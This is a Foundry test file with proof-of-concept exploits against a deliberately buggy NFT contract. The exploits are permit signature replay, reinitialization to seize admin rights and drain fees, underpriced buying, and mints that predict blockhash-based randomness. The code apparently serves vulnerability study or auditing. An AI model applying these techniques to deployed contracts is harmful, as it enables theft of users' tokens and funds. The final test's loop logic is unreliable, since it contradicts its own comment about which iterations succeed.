// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/BuggyNFT.sol";

contract PermitExploitTest is Test {
    BuggyNFT public buggyNFT;
    address public owner;
    address public attacker;
    uint256 public tokenId;

    function setUp() public {
        owner = vm.addr(1);
        attacker = vm.addr(2);

        buggyNFT = new BuggyNFT(); // Deploy the vulnerable contract
        buggyNFT.initialize();

        vm.deal(owner, 1 ether);
        vm.startPrank(owner);
        tokenId = buggyNFT.mint{value: 0.1 ether}(
            IERC20(address(0)),
            0.1 ether
        ); // Mint an NFT as the owner
        vm.stopPrank();
        assertTrue(
            buggyNFT.isOwner(tokenId, owner),
            "Owner should own the NFT"
        );
    }

    function testExploitPermit() public {
        vm.startPrank(owner);

        // Step 1: Owner signs the permit once
        bytes32 structHash = keccak256(
            abi.encode(buggyNFT.PERMIT_TYPEHASH(), tokenId, attacker)
        );
        bytes32 signingHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                buggyNFT.DOMAIN_SEPARATOR(),
                structHash
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(0x1, signingHash);

        // Step 2: Use the permit to approve the attacker the first time
        buggyNFT.permit(tokenId, attacker, 0, v, r, s);

        // Check that the attacker is approved
        assertTrue(
            buggyNFT.isApproved(tokenId, attacker),
            "Attacker should be approved"
        );

        vm.stopPrank();

        // Step 3: Exploit - Reuse the same v, r, s to approve again
        vm.startPrank(attacker);

        // Reuse the same signature to reapprove the attacker
        buggyNFT.permit(tokenId, attacker, 0, v, r, s);

        // Reuse the signature again to approve attacker a second time
        buggyNFT.permit(tokenId, attacker, 0, v, r, s);

        // Check that the attacker is still approved
        assertTrue(
            buggyNFT.isApproved(tokenId, attacker),
            "Attacker should still be approved after reusing the signature"
        );

        // Potentially transfer the token to the attacker
        buggyNFT.transfer(tokenId, attacker, "");

        // Verify ownership after exploiting the permit function
        assertTrue(
            buggyNFT.isOwner(tokenId, attacker),
            "Attacker should now own the NFT"
        );

        vm.stopPrank();
    }
}

contract InitializeExploitTest is Test {
    BuggyNFT public buggyNFT;
    address public owner;
    address public attacker;
    uint256 public constant PROTOCOL_FEE = 5;
    uint256 public constant PROTOCOL_FEE_BASIS = 1000;
    uint tokenPrice = 1 ether;

    function setUp() public {
        owner = vm.addr(1); // Simulate the legitimate owner
        attacker = vm.addr(2); // Simulate the attacker
        buggyNFT = new BuggyNFT(); // Deploy the vulnerable contract

        // Mint some tokens to collect fees
        vm.deal(owner, 2 ether);
        vm.startPrank(owner);
        buggyNFT.initialize(); // Legitimately initialize the contract
        buggyNFT.mint{value: tokenPrice}(IERC20(address(0)), tokenPrice); // Mint NFT and pay fee
        buggyNFT.mint{value: tokenPrice}(IERC20(address(0)), tokenPrice); // Mint another NFT and pay fee
        vm.stopPrank();
    }

    function testExploitInitialize() public {
        // Calculate the total fees collected
        uint256 totalFees = (tokenPrice * 2 * PROTOCOL_FEE) /
            PROTOCOL_FEE_BASIS;

        vm.startPrank(attacker);

        // Step 1: Attacker reinitializes the contract to become the admin
        buggyNFT.initialize();

        // Step 2: Attacker collects all the fees
        buggyNFT.collect(payable(attacker), IERC20(address(0))); // Collect ETH fees

        // Check that the attacker has successfully collected the fees
        assertEq(
            attacker.balance,
            totalFees,
            "Attacker should have collected all the fees"
        );

        vm.stopPrank();
    }
}

contract BuyExploit is Test {
    BuggyNFT public buggyNFT;
    address public owner;
    address public attacker;

    uint256 tokenPrice = 1 ether;
    uint256 newTokenPrice = 1.01 ether; // attacker is supposed to buy at 1.1 ether, if the buy function works as intended
    uint256 tokenId;
    uint256 correctNewPrice = (tokenPrice * 110) / 100;

    function setUp() public {
        buggyNFT = new BuggyNFT();
        buggyNFT.initialize();
        owner = vm.addr(1);
        attacker = vm.addr(2);
        // attacker2 = vm.addr(3);

        vm.deal(owner, 2 ether);
        vm.deal(attacker, 2 ether);

        vm.startPrank(owner);
        tokenId = buggyNFT.mint{value: tokenPrice}(
            IERC20(address(0)),
            tokenPrice
        );
        vm.stopPrank();
    }

    function testCheapBuyPriceExploit() public {
        vm.startPrank(attacker);

        // Use a new price that is higher than the old price (to prevent integer overflows) but lower than 110% of the original price
        buggyNFT.buy{value: newTokenPrice}(
            tokenId,
            IERC20(address(0)),
            newTokenPrice
        );

        // check that attacker has ownership of the token, even though less was paid than the contract intended
        assertTrue(
            buggyNFT.isOwner(tokenId, attacker),
            "Attacker should own the NFT"
        );

        // check that new price is less than 110% more than the last price
        assertLt(
            newTokenPrice,
            correctNewPrice,
            "The new price should be at least 110% of the last price"
        );

        vm.stopPrank();
    }
}

contract PredictableMintExploit is Test {
    BuggyNFT public buggyNFT;
    address public owner;
    address public attacker;
    uint256 public tokenPrice = 1 ether;
    uint256 ownerTokenId;
    uint256 ownerTokenLevel;

    function setUp() public {
        buggyNFT = new BuggyNFT();
        buggyNFT.initialize();
        owner = vm.addr(1);
        attacker = vm.addr(2);

        vm.deal(owner, 10 ether);
        vm.deal(attacker, 10 ether);

        // mint one token to the owner
        vm.startPrank(owner);

        ownerTokenId = buggyNFT.mint{value: tokenPrice}(
            IERC20(address(0)),
            tokenPrice
        );
        vm.stopPrank();

        ownerTokenLevel = buggyNFT.level(ownerTokenId);
        emit log_named_uint("Owner Token Level", ownerTokenLevel);
    }

    function testPredictableMintExploit() public {
        vm.startPrank(attacker);

        for (uint256 i = 0; i < 200; i++) {
            // Move to the next block to precompute the blockhash of block.number - 1
            vm.roll(block.number + i); // Simulate moving to a new block

            // Precompute the tokenId that will be generated in the next mint
            bytes32 precomputedHash = keccak256(
                abi.encodePacked(
                    address(buggyNFT),
                    blockhash(block.number - 1), // Predict the blockhash
                    attacker,
                    buggyNFT.nextNonce() // Predict the nextNonce
                )
            );
            uint256 predictedTokenId = uint256(precomputedHash);

            // check the rarity level of the predicted tokenId using the contract's `level` function
            uint256 predictedLevel = buggyNFT.level(predictedTokenId);

            // If the rarity level is higher than first owner's, mint the token
            // i = 162, 189, and 199 result in a higher rarity level than the owner's token
            if (predictedLevel > ownerTokenLevel) {
                console.log("i to mint:", i);
                console.log("minting token");
                uint256 mintedTokenId = buggyNFT.mint{value: 0.01 ether}(
                    IERC20(address(0)),
                    0.01 ether
                );
                emit log_named_uint("Minted Token ID", mintedTokenId);

                // Ensure the minted tokenId matches the predicted one
                assertEq(
                    mintedTokenId,
                    predictedTokenId,
                    "Minted tokenId should match the predicted tokenId"
                );

                // Check that atacker owns the token
                assertTrue(
                    buggyNFT.isOwner(mintedTokenId, attacker),
                    "Attacker should own the NFT"
                );
            } else {
                break;
            }
        }

        vm.stopPrank();
    }
}
